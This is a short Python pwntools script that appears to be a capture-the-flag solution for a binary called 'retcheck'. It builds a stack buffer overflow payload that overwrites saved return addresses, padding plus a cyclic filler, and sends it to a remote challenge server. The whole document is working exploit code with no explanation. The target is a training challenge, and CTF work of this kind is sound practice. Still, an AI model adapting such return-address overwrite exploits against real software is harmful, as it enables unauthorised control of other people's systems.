from pwn import *
context.arch = 'amd64'

offset = 0x190+8
payload = b""
payload += b"A" * offset
payload += p64(0x401465)
payload += cyclic(cyclic_find(0x61616163))
payload += p64(0x4012e9)

flag = False

if flag:
    p = process("./retcheck")
else:
    p = remote("challenge.ctf.games",31463)

p.recv()
p.sendline(payload)
print(p.recvall())
